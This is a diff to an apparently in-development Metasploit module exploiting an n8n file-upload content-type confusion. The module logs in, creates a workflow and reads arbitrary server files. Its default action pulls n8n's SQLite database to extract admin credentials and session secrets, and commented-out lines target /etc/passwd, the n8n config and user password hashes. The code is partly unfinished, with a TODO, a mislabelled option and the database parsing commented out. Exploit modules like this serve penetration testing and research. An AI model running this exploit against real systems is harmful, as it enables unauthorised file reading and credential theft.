@@ -2,10 +2,13 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+require 'sqlite3'
 
 class MetasploitModule < Msf::Auxiliary
-
+  
   include Msf::Exploit::Remote::HttpClient
+  include Rex::Proto::Http::WebSocket
+
   def initialize(info = {})
     super(
       update_info(
@@ -16,8 +19,12 @@ class MetasploitModule < Msf::Auxiliary
           'dor attias', # research
           'msutovsky-r7' # module
         ],
+        'Actions' => [
+          ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
+          ['EXTRACT_ADMIN_SESSION', { 'Description' => 'Create admin JWT sessio key by reading out secrets' }]
+        ],
+        'DefaultAction' => 'EXTRACT_ADMIN_SESSION',
         'License' => MSF_LICENSE,
-        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
         'Notes' => {
           'Stability' => [],
           'Reliability' => [],
@@ -26,28 +33,32 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options([
-      OptString.new('FORM_URI', [true, 'n8n form URI', ''])
+      OptString.new('SPOOFED_USERNAME', [false, 'Username of n8n']),
+      OptString.new('FILENAME', [false, 'Username of n8n']),
+      OptString.new('USERNAME', [true, 'Username of n8n', '']),
+      OptString.new('PASSWORD', [true, 'Password of n8n', ''])
     ])
   end
 
-  def content_type_confusion_upload(filename)
+  def content_type_confusion_upload(form_uri, filename)
+    extraction_filename = "#{Rex::Text.rand_text_alpha(rand(8..11))}.pdf"
     json_data = {
       files: {
         "field-0":
         {
           filepath: filename,
-          originalFilename: 'product.pdf',
+          originalFilename: extraction_filename,
           mimeType: 'text/plain',
           extenstion: ''
         }
       },
       data: [
-        'not really important'
+        Rex::Text.rand_text_alpha(12)
       ],
-      executionId: 'not really important'
+      executionId: Rex::Text.rand_text_alpha(12)
     }
-    send_request_cgi({
-      'uri' => normalize_uri(datastore['FORM_URI']),
+    res = send_request_cgi({
+      'uri' => normalize_uri('form-test',form_uri),
       'method' => 'POST',
       'ctype' => 'application/json',
       'data' => json_data.to_json
@@ -55,13 +66,253 @@ class MetasploitModule < Msf::Auxiliary
 
     fail_with(Failure::UnexpectedReply, 'Received unexpected response') unless res&.code == 200
 
-    res.get_json_document
+    json_res = res.get_json_document
 
-    fail_with(Failure::PayloadFailed, 'Failed to load target file') unless json_res['status'] != 200
+    fail_with(Failure::PayloadFailed, 'Failed to load target file') unless json_res['status'] != '200'
   end
 
+  def login
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'rest', 'login'),
+      'ctype' => 'application/json',
+      'keep_cookies' => true,
+      'data' => {
+        'emailOrLdapLoginId' => datastore['USERNAME'],
+        'email' => datastore['USERNAME'],
+        'password' => datastore['PASSWORD']
+      }.to_json
+    )
+
+    return true if res&.code == 200
+
+    json_data = res.get_json_document
+
+    print_error("Login failed: #{json_data['message']}")
+
+    false
+  end
+
+  def create_file_upload_workflow
+    @workflow_name = "workflow_#{Rex::Text.rand_text_alphanumeric(8)}"
+
+    workflow_data = {
+      'name' => @workflow_name,
+      'active' => false,
+      'settings' => {
+        'saveDataErrorExecution' => 'all',
+        'saveDataSuccessExecution' => 'all',
+        'saveManualExecutions' => true,
+        'executionOrder' => 'v1'
+      },
+      nodes: [
+        {
+          parameters: {
+            formTitle: 'Superform',
+            formFields: {
+              values: [
+                {
+                  fieldLabel: 'Superfield',
+                  fieldType: 'file'
+                }
+              ]
+            },
+            options: {}
+          },
+          type: 'n8n-nodes-base.formTrigger',
+          typeVersion: 2.3,
+          position: [0, 0],
+          id: 'e4f12efa-9975-4041-b71f-0ce4999ec5a7',
+          name: 'On form submission',
+          webhookId: '594fbf70-b077-41e0-89b6-b9dc856cd370'
+        }
+      ],
+      'connections' => {},
+      settings: { executionOrder: 'v1' }
+    }
+
+    print_status('Creating file upload workflow...')
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows'),
+      'ctype' => 'application/json',
+      'keep_cookies' => true,
+      'data' => workflow_data.to_json
+    )
+    fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}") unless res&.code == 200 || res&.code == 201
+
+    json = res.get_json_document
+
+    @workflow_id = json.dig('data', 'id') || json['id']
+    nodes = json.dig('data', 'nodes')
+    version_id = json.dig('data', 'versionId')
+    id = json.dig('data', 'id')
+
+    fail_with(Failure::UnexpectedReply, 'Failed to get workflow ID from response') unless @workflow_id && nodes && version_id && id
+
+    activation_data = {
+      'workflowData' => {
+        'name' => @workflow_name,
+        'nodes' => nodes,
+        'pinData' => {},
+        'connections' => {},
+        'active' => false,
+        'settings' => {
+          'saveDataErrorExecution' => 'all',
+          'saveDataSuccessExecution' => 'all',
+          'saveManualExecutions' => true,
+          'executionOrder' => 'v1'
+        },
+        'tags' => [],
+        'versionId' => version_id,
+        'meta' => 'null',
+        'id' => id
+      },
+      startNodes: [
+        {
+          name: 'On form submission',
+          sourceData: 'null'
+        }
+      ],
+      destinationNode: 'On form submission'
+    }
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'run'),
+      'ctype' => 'application/json',
+      'keep_cookies' => true,
+      'data' => activation_data.to_json
+    )
+    
+    fail_with(Failure::PayloadFailed, "Failed to run file upload") unless res&.code == 200
+    
+    json_data = res.get_json_document
+
+    fail_with(Failure::PayloadFailed, "Failed to run file upload") unless json_data.dig('data','waitingForWebhook') == true
+    '594fbf70-b077-41e0-89b6-b9dc856cd370' 
+  end
+  
+  def get_execution_id
+  
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('rest','executions'),
+      'vars_get' => 
+      {
+        'filter' => %<{"workflowId":"#{@workflow_id}"}>,
+        'limit' => 10
+      }
+    })
+    fail_with(Failure::PayloadFailed, "") unless res&.code == 200;
+    
+    json_data = res.get_json_document
+
+    run_id = json_data.dig('data','results',0,'id')
+    fail_with(Failure::PayloadFailed, "") unless run_id
+
+    run_id
+  end
+
+
+  def archive_workflow
+    print_status("Cleaning up workflow #{@workflow_id}...")
+
+    send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'archive'),
+      'keep_cookies' => true
+    )
+  end
+
+  def delete_workflow
+      send_request_cgi(
+        'method' => 'DELETE',
+        'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s)
+      )
+  end
+
+  def extract_content(run_id)
+  
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('rest','executions',run_id)
+    })
+
+    fail_with(Failure::PayloadFailed, "") unless res&.code == 200
+
+    json_data = res.get_json_document
+    
+    file_data = json_data.dig('data','data')
+    
+    fail_with(Failure::PayloadFailed, "") unless file_data
+
+    #TODO: add begin block
+
+    parsed_file_data = JSON.parse(file_data)
+    
+    file_content_enc = parsed_file_data[29]
+
+    file_content = ::Base64.decode64(file_content_enc)
+
+    file_content
+
+  end
+  
+  def read_file(filename)
+  
+    form_uri = create_file_upload_workflow
+
+    content_type_confusion_upload(form_uri, filename)
+   
+    run_id = get_execution_id
+
+    file_content = extract_content(run_id)
+    
+    archive_workflow
+
+    delete_workflow
+
+    file_content
+  end
+
+  def check; end
+
   def run
-    content_type_confusion_upload('/etc/passwd')
+    fail_with(Failure::NoAccess, 'Failed to login') unless login
+    
+    case action.name
+      when 'READ_FILE'
+        
+        puts read_file(datastore['FILENAME'])
+
+      when 'EXTRACT_ADMIN_SESSION'
+        db_content = read_file('/home/node/.n8n/database.sqlite')
+        #puts db_content.class
+       # db = SQLite3::Database.new(db_content)
+       # result = db.execute(%<select id,password from user where email='#{datastore['SPOOFED_USERNAME']}'>)
+       # puts result
+    end
+
+#    form_uri = create_file_upload_workflow
+#    #content_type_confusion_upload(form_uri, '/etc/passwd')
+#    #content_type_confusion_upload(form_uri, '/home/node/.n8n/database.sqlite')
+#    content_type_confusion_upload(form_uri, '/home/node/.n8n/config')
+#    #/rest/executions?filter=%7B%22workflowId%22%3A%22wlUENWX77ZX64YgH%22%7D&limit=10
+#   
+#    run_id = get_execution_id
+#
+#    puts run_id
+#
+#    file_content = extract_content
+#
+#    puts file_content
+    
+    #db = SQLite3::Database.new(file_content)
+    
+    #select id,password from user where email='admin@gmail.com';
+
   end
 
 end
